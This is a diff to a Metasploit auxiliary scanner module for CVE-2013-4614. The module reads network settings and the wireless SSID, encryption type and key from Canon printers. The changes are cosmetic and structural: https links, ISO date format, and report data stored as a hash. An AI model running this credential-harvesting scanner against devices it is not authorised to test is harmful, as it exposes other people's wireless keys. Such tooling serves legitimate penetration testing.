@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'nokogiri'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Scanner
@@ -28,9 +26,9 @@ class MetasploitModule < Msf::Auxiliary
       'References'     => [
         [ 'CVE', '2013-4614' ],
         [ 'OSVDB', '94417' ],
-        [ 'URL', 'http://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
+        [ 'URL', 'https://www.mattandreko.com/2013/06/canon-y-u-no-security.html']
       ],
-      'DisclosureDate' => 'Jun 18 2013'))
+      'DisclosureDate' => '2013-06-18'))
   end
 
   def get_network_settings
@@ -129,14 +127,24 @@ class MetasploitModule < Msf::Auxiliary
     ns = get_network_settings
     return if ns.nil?
 
-    good_string = "#{rhost}:#{rport} Option: #{ns[0]}"
+    data = {
+      :rhost => rhost,
+      :rport => rport,
+      :option => ns[0]
+    }
     if ns[0] == 'Use wireless LAN'
       wireless_key = get_wireless_key
-      good_string += "\tSSID: #{ns[1]}\tEncryption Type: #{wireless_key[0]}\tKey: #{wireless_key[1]}"
+      data.merge!(
+        {
+          :ssid => ns[1],
+          :encryption_type => wireless_key[0],
+          :key => wireless_key[1]
+        }
+      )
     end
 
     report_note({
-      :data => good_string,
+      :data => data,
       :type => 'canon.wireless',
       :host => ip,
       :port => rport
